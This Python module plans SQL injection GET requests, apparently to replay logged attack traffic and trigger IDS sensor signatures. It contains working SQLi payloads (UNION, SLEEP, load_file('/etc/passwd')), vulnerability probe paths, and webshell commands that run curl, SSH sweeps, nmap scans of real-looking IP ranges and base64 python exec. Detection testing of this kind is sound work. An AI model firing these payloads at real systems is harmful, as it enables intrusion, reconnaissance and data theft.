"""SQL injection payload and URL planning — Stellar suspected-query GET requests."""

from __future__ import annotations

import base64
from dataclasses import dataclass
from typing import Any
from urllib.parse import quote

from dsp.protocols.base import HttpProtocolError
from dsp.protocols.http.urls import (
    MAX_HOSTS_DEFAULT,
    build_url,
)

# Stellar External/Internal Suspected SQL Injection Documents (2026-06-23).
SQLI_PATHS: tuple[str, ...] = (
    "/2015/sessions?utf8=%E2%9C%93&session[username]=test12341%27%20%2B%20(SELECT%200%20FROM%20(SELECT%20SLEEP(3))qsqli_2222)%20%2B%20%27&session[password]=test1234567&session[redirect_url]=%2F2015%2Fprodu...",
    "/?author=1",
    "/?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g",
    "/DeviceInformation",
    "/WEB-INF/web.xml",
    "/WEB-INF/web.xml?id=%00%00%00",
    "/WEB_VMS/LEVEL15/",
    "/api/v1/components?name=1&1%5B0%5D&1%5B1%5D=a&1%5B2%5D&1%5B3%5D=or+'a'='a')%20and%20(select%20sleep(6))--",
    "/api/v3/notifications?pageSize=0&filters=%5B%7B%22readIAN%22%3A%7B%22operator%22%3A%22%3D%22%2C%22values%22%3A%5B%22f%22%5D%7D%7D%5D",
    "/bsh.servlet.BshServlet",
    "/cdn-cgi/challenge-platform/h/b/rc/a010b054ace6ebfc",
    "/cdn-cgi/challenge-platform/h/b/rc/a021918c1bf9e791",
    "/cdn-cgi/challenge-platform/h/g/rc/a0847ff8bdf2b5cf",
    "/cdn-cgi/challenge-platform/h/g/rc/a0a8c257f8a155d8",
    "/cdn-cgi/challenge-platform/h/g/rc/a0b99a816b3bb7c5",
    "/cdn-cgi/challenge-platform/h/g/rc/a0d59fdfd913cc12",
    "/cmd.jsp?file=..%2F..%2Fweb.xml",
    "/dvwa/",
    "/favicon.ico",
    "/formmail/formmailto.html",
    "/login",
    "/qLWWcLUO.koi8-r",
    "/servlet/~ic/bsh.servlet.BshServlet",
    "/shell.jsp",
    "/shell.jsp?cmd=b64_nw%28%29%7B+if+command+-v+base64+%3E%2Fdev%2Fnull+2%3E%261%3B+then+base64+-w+0+2%3E%2Fdev%2Fnull+%7C%7C+base64+%7C+tr+-d+%22%5Cn%22%3B+elif+command+-v+openssl+%3E%2Fdev%2Fnull+2%3E%...",
    "/shell.jsp?cmd=bash+%3C%3C%27INTERNAL_FANOUT_SCRIPT%27%0Anormal_uas%3D%27Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F120.0.0.0+Safari%2F...",
    "/shell.jsp?cmd=bash+%3C%3C%27SIG_UA_SCRIPT%27%0Ab64_nw%28%29%7B+if+command+-v+base64+%3E%2Fdev%2Fnull+2%3E%261%3B+then+base64+-w+0+2%3E%2Fdev%2Fnull+%7C%7C+base64+%7C+tr+-d+%22%5Cn%22%3B+elif+command+...",
    "/shell.jsp?cmd=command+-v+ping+2%3E%2Fdev%2Fnull+%7C%7C+true%3B+_poc_ec%3D%24%3F%3B+echo+__EXIT_CODE%3A%24%7B_poc_ec%7D",
    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+Go-http-client%2F1.1+-H+X-Request-ID%3A%5C+31603-31084-1+-H+X-Session-ID...",
    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+10565-24638-22+-H+X-Sessi...",
    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+22475-25821-11+-H+X-Sessi...",
    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+24479-15225-11+-H+X-Sessi...",
    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+26396-27273-1+-H+X-Sessio...",
    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+29830-30973-3+-H+X-Sessio...",
    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+GET+--user-agent+TelemetryCollector%2F9.7+-H+X-Request-ID%3A%5C+7592-23678-17+-H+X-Sessio...",
    "/shell.jsp?cmd=curl+--silent+--show-error+--max-time+3+--connect-timeout+8+--retry+1+--retry-delay+1+--request+HEAD+--user-agent+TelemetryAgent%2F1.1+-H+X-Request-ID%3A%5C+29011-29952-15+-H+X-Session-...",
    "/shell.jsp?cmd=for+i+in+%24%28seq+1+100%29%3B+do+ssh+-o+BatchMode%3Dyes+-o+ConnectTimeout%3D2+-o+StrictHostKeyChecking%3Dno+-o+UserKnownHostsFile%3D%2Fdev%2Fnull+-o+GlobalKnownHostsFile%3D%2Fdev%2Fnul...",
    "/shell.jsp?cmd=for+i+in+%24%28seq+1+300%29%3B+do+ssh+-o+BatchMode%3Dyes+-o+ConnectTimeout%3D2+-o+StrictHostKeyChecking%3Dno+-o+UserKnownHostsFile%3D%2Fdev%2Fnull+-o+GlobalKnownHostsFile%3D%2Fdev%2Fnul...",
    "/shell.jsp?cmd=head_code%3D%24%28curl+-k+-s+-o+%2Fdev%2Fnull+-w+%27%25%7Bhttp_code%7D%27+--max-time+5+-I+%27https%3A%2F%2F221.139.249.122%3A443%2F%27+2%3E%2Fdev%2Fnull+%7C%7C+echo+000%29%3B+get_code%3...",
    "/shell.jsp?cmd=mkdir+-p+%27%2Ftmp%2F.poc_runtime_root%27+%27%2Ftmp%2F.poc_runtime_root%2Fstage%27+%27%2Ftmp%2F.poc_runtime_root%2Ffake%27+%27%2Ftmp%2F.poc_runtime_root%2Fstate%27+%27%2Ftmp%2F.poc_runt...",
    "/shell.jsp?cmd=nmap+-Pn+-n+-T4+--max-retries+1+--host-timeout+15s+-p+22%2C53%2C80%2C443%2C445%2C389%2C8080%2C8443%2C6379%2C9200%2C27017+--open+221.139.249.65-96",
    "/shell.jsp?cmd=nmap+-Pn+-n+-T4+--max-retries+1+--host-timeout+15s+-p+22%2C53%2C80%2C5000%2C5001%2C7001%2C7002%2C8000%2C8008%2C8080%2C8081%2C8082%2C8088%2C8888%2C9000%2C9090%2C10000%2C443%2C8443%2C9443...",
    "/shell.jsp?cmd=normal_uas%3D%27Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F120.0.0.0+Safari%2F537.36%27%0Arare_uas%3D%27TelemetryCollect...",
    "/shell.jsp?cmd=python3+-c+import%5C+base64%5C%3Bexec%5C%28base64.b64decode%5C%28%5C%27aW1wb3J0IHJhbmRvbSwgc29ja2V0LCB0aW1lCmRlYWRfaXBzID0gW2YiMjIxLjEzOS4yNDkue3h9IiBmb3IgeCBpbiBbMTk5LDIwMSwyMDMsMjA1LD...",
    "/shell.jsp?cmd=sh+-c+mkdir%5C+-p%5C+%5C%27%2Ftmp%2F.poc_runtime_root%5C%27%5C+%5C%27%2Ftmp%2F.poc_runtime_root%2Fstage%5C%27%5C+%5C%27%2Ftmp%2F.poc_runtime_root%2Ffake%5C%27%5C+%5C%27%2Ftmp%2F.poc_run...",
    "/storekontak",
    "/sys/ui/extend/varkind/custom.jsp",
    "/wp-admin/options-general.php?page=smartcode",
    "/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php",
    "/wp-content/plugins/feed-them-social/readme.txt",
    "/wp-content/plugins/mainwp-vuln/readme.txt",
    "/wp-content/plugins/raygun4wp/readme.txt",
    "/zentao/user-login.html",
)

SQLI_SUSPECTED_QUERY_CATEGORY = "suspected_query"
SQLI_CORE_TIME_BASED_CATEGORY = "core_time_based"
SQLI_CORE_UNION_SELECT_CATEGORY = "core_union_select"
# Historical full-pool multiplicity (53 paths x 3). Volume is driven by max_per_host.
SQLI_REPEATS_PER_PATH = 3
SQLI_REQUESTS_PER_HOST = 500
# Sensor-aligned signature payloads — minimum repeats per discovered HTTP target.
SQLI_CORE_REPEATS_PER_PATTERN = 10
SQLI_CORE_SLEEP_SECONDS: tuple[int, ...] = (5, 6, 7, 8, 9, 5, 6, 7, 8, 10)
SQLI_CORE_MD5_SEEDS: tuple[int, ...] = (
    111111111,
    999999999,
    123456789,
    222222222,
    333333333,
    444444444,
    555555555,
    666666666,
    777777777,
    888888888,
)

SQLI_PARAM_NAMES: tuple[str, ...] = (
    "id",
    "user",
    "username",
    "q",
    "search",
    "product",
    "item",
    "category",
    "sort",
    "filter",
)

SQLI_PAYLOAD_CATEGORIES: dict[str, tuple[str, ...]] = {
    "boolean_based": (
        "' OR '1'='1",
        "' OR 1=1--",
        "1' AND '1'='1",
        "admin' AND 1=1--",
    ),
    "union_select": (
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "1 UNION SELECT user(),database()--",
    ),
    "core_time_based": (
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(6)))a)-- -",
    ),
    "core_union_select": (
        "-1 UNION SELECT 1,MD5(999999999),3--",
    ),
    "time_based": (
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:3'--",
        "1' AND pg_sleep(3)--",
    ),
    "error_based": (
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
    ),
    "comment_bypass": (
        "admin'--",
        "admin'#",
        "admin'/*",
    ),
    "encoded": (
        "%27%20OR%201%3D1--",
        "1%27%20OR%20%271%27%3D%271",
    ),
    "case_variation": (
        "' oR '1'='1",
        "' UnIoN SeLeCt 1--",
    ),
    "boolean_extended": (
        "' OR '1'='1",
        '" OR "1"="1',
        "') OR ('1'='1",
    ),
    "union_extended": (
        "UNION SELECT NULL,NULL,NULL",
        "UNION ALL SELECT",
        "UNION SELECT user(),database()",
    ),
    "order_by_enumeration": (
        "ORDER BY 10",
        "ORDER BY 50",
        "ORDER BY 100",
    ),
    "db_metadata": (
        "@@version",
        "version()",
        "database()",
        "user()",
        "current_user()",
        "information_schema.tables",
        "information_schema.columns",
    ),
    "mysql_error": (
        "extractvalue(1,concat(0x7e,user()))",
        "updatexml(1,concat(0x7e,user()),1)",
    ),
    "mysql_time": (
        "benchmark(1000000,md5(1))",
        "sleep(5)",
    ),
    "mssql_time": (
        "WAITFOR DELAY '00:00:05'",
    ),
    "file_access": (
        "load_file('/etc/passwd')",
        "into outfile",
    ),
}

SQLI_TRANSPORTS: tuple[str, ...] = ("query", "form", "json")

# Backward-compatible flat payload list for legacy tests.
SQLI_PAYLOADS: tuple[str, ...] = tuple(
    payload for group in SQLI_PAYLOAD_CATEGORIES.values() for payload in group
)


@dataclass(frozen=True)
class PlannedSqliRequest:
    host: str
    port: int
    path: str
    parameter: str
    payload: str
    payload_category: str
    transport: str
    method: str = "GET"
    query: str = ""
    body: bytes | None = None
    content_type: str | None = None
    encode_query: bool = True

    @property
    def url(self) -> str:
        return build_sqli_url(
            self.host,
            self.port,
            self.path,
            self.query,
            encode_query=self.encode_query,
        )


def build_sqli_url(
    host: str,
    port: int,
    path: str,
    query: str,
    *,
    encode_query: bool = True,
) -> str:
    """Build HTTP/HTTPS URL with optional query string appended to path."""
    base = build_url(host, port, path)
    if not query:
        return base
    if encode_query:
        encoded = quote(query, safe="='&?")
    else:
        encoded = query
    return f"{base}?{encoded}"


def _split_suspected_query(suspected: str) -> tuple[str, str]:
    """Split a Stellar suspected query into HTTP path and query string."""
    if "?" in suspected:
        path, query = suspected.split("?", 1)
        return path, query
    return suspected, ""


def _param_payload_base_paths(paths: tuple[str, ...]) -> tuple[str, ...]:
    """Derive clean URI paths (no query) from the existing SQLi path pool."""
    ordered: list[str] = []
    seen: set[str] = set()
    for item in paths:
        base = item.split("?", 1)[0].strip() or "/"
        if not base.startswith("/"):
            base = f"/{base}"
        if base not in seen:
            seen.add(base)
            ordered.append(base)
    return tuple(ordered) if ordered else ("/",)


def build_core_time_based_payload(sleep_seconds: int) -> str:
    """Time-based SQLi payload aligned to Suricata SLEEP() signatures."""
    return f"1' AND (SELECT 1 FROM (SELECT(SLEEP({int(sleep_seconds)})))a)-- -"


def build_core_union_select_payload(md5_seed: int) -> str:
    """UNION SELECT SQLi payload with MD5() marker for sensor signatures."""
    return f"-1 UNION SELECT 1,MD5({int(md5_seed)}),3--"


def core_time_based_payloads(
    *,
    count: int = SQLI_CORE_REPEATS_PER_PATTERN,
) -> tuple[str, ...]:
    """Return ``count`` time-based payloads with sleep-second variation."""
    if count < 1:
        return ()
    return tuple(
        build_core_time_based_payload(
            SQLI_CORE_SLEEP_SECONDS[index % len(SQLI_CORE_SLEEP_SECONDS)]
        )
        for index in range(count)
    )


def core_union_select_payloads(
    *,
    count: int = SQLI_CORE_REPEATS_PER_PATTERN,
) -> tuple[str, ...]:
    """Return ``count`` UNION SELECT payloads with MD5 seed variation."""
    if count < 1:
        return ()
    return tuple(
        build_core_union_select_payload(
            SQLI_CORE_MD5_SEEDS[index % len(SQLI_CORE_MD5_SEEDS)]
        )
        for index in range(count)
    )


def _build_suspected_query_request(
    host: str,
    port: int,
    suspected: str,
) -> PlannedSqliRequest:
    path, embedded_query = _split_suspected_query(suspected)
    return PlannedSqliRequest(
        host=host,
        port=port,
        path=path,
        parameter="",
        payload=embedded_query or suspected,
        payload_category=SQLI_SUSPECTED_QUERY_CATEGORY,
        transport="query",
        method="GET",
        query=embedded_query,
        encode_query=False,
    )


def _build_param_payload_request(
    host: str,
    port: int,
    *,
    path: str,
    parameter: str,
    payload: str,
    payload_category: str,
) -> PlannedSqliRequest:
    """Build a GET request with payload as a single-encoded query parameter value."""
    # Encode once only — build_sqli_url must not re-encode (encode_query=False).
    encoded_value = quote(payload, safe="")
    query = f"{parameter}={encoded_value}"
    return PlannedSqliRequest(
        host=host,
        port=port,
        path=path,
        parameter=parameter,
        payload=payload,
        payload_category=payload_category,
        transport="query",
        method="GET",
        query=query,
        encode_query=False,
    )


def _plan_core_signature_requests(
    host: str,
    port: int,
    *,
    paths: tuple[str, ...],
    repeats_per_pattern: int = SQLI_CORE_REPEATS_PER_PATTERN,
) -> list[PlannedSqliRequest]:
    """Plan sensor-aligned core SQLi signatures as query-parameter GETs."""
    base_paths = _param_payload_base_paths(paths)
    plans: list[PlannedSqliRequest] = []
    seq = 0
    for payload in core_time_based_payloads(count=repeats_per_pattern):
        path = base_paths[seq % len(base_paths)]
        parameter = SQLI_PARAM_NAMES[seq % len(SQLI_PARAM_NAMES)]
        plans.append(
            _build_param_payload_request(
                host,
                port,
                path=path,
                parameter=parameter,
                payload=payload,
                payload_category=SQLI_CORE_TIME_BASED_CATEGORY,
            )
        )
        seq += 1
    for payload in core_union_select_payloads(count=repeats_per_pattern):
        path = base_paths[seq % len(base_paths)]
        parameter = SQLI_PARAM_NAMES[seq % len(SQLI_PARAM_NAMES)]
        plans.append(
            _build_param_payload_request(
                host,
                port,
                path=path,
                parameter=parameter,
                payload=payload,
                payload_category=SQLI_CORE_UNION_SELECT_CATEGORY,
            )
        )
        seq += 1
    return plans


def sql_injection_request_items(plans: list[PlannedSqliRequest]) -> list[dict[str, Any]]:
    """Serialize planned SQLi requests for webshell command and bundle execution."""
    requests: list[dict[str, Any]] = []
    for plan in plans:
        item: dict[str, Any] = {
            "url": plan.url,
            "method": plan.method,
            "payload_category": plan.payload_category,
            "parameter": plan.parameter,
        }
        if plan.body is not None:
            item["body_b64"] = base64.b64encode(plan.body).decode("ascii")
            item["content_type"] = plan.content_type
        requests.append(item)
    return requests


def plan_sqli_requests(
    *,
    endpoints: list[tuple[str, int]],
    max_hosts: int = MAX_HOSTS_DEFAULT,
    max_per_host: int = SQLI_REQUESTS_PER_HOST,
    max_total: int | None = None,
    paths: tuple[str, ...] = SQLI_PATHS,
    repeats_per_path: int | None = None,
    include_core_signatures: bool = True,
    core_repeats_per_pattern: int = SQLI_CORE_REPEATS_PER_PATTERN,
) -> list[PlannedSqliRequest]:
    """
    Plan SQL injection HTTP GET requests across explicit endpoints.

    Default volume is ``max_per_host`` requests per endpoint. When
    ``include_core_signatures`` is True (normal/default path), each host first
    receives time-based and UNION SELECT signature payloads (query parameters),
    then remaining slots are filled by cycling ``paths``.

    When ``repeats_per_path`` is set explicitly, legacy path-only mode is used
    (no core signatures) so encoding/parity fixtures stay stable.
    """
    if max_total is None:
        max_total = max_per_host * max(1, max_hosts)
    if max_hosts < 1 or max_per_host < 1 or max_total < 1:
        raise HttpProtocolError("request caps must be positive")
    if repeats_per_path is not None and repeats_per_path < 1:
        raise HttpProtocolError("repeats_per_path must be positive")
    if core_repeats_per_pattern < 1:
        raise HttpProtocolError("core_repeats_per_pattern must be positive")
    if not paths:
        raise HttpProtocolError("at least one path is required")

    selected: list[tuple[str, int]] = [
        (h.strip(), int(p)) for h, p in endpoints if h.strip() and int(p) > 0
    ][:max_hosts]
    if not selected:
        raise HttpProtocolError("at least one endpoint is required")

    legacy_path_mode = repeats_per_path is not None
    if legacy_path_mode:
        target_per_host = min(max_per_host, len(paths) * int(repeats_per_path))
        emit_core = False
    else:
        target_per_host = max_per_host
        emit_core = include_core_signatures

    plans: list[PlannedSqliRequest] = []
    for host, port in selected:
        host_sent = 0
        if emit_core:
            for core_plan in _plan_core_signature_requests(
                host,
                port,
                paths=paths,
                repeats_per_pattern=core_repeats_per_pattern,
            ):
                if host_sent >= target_per_host or len(plans) >= max_total:
                    break
                plans.append(core_plan)
                host_sent += 1

        path_idx = 0
        while host_sent < target_per_host and len(plans) < max_total:
            suspected = paths[path_idx % len(paths)]
            plans.append(_build_suspected_query_request(host, port, suspected))
            path_idx += 1
            host_sent += 1

    return plans
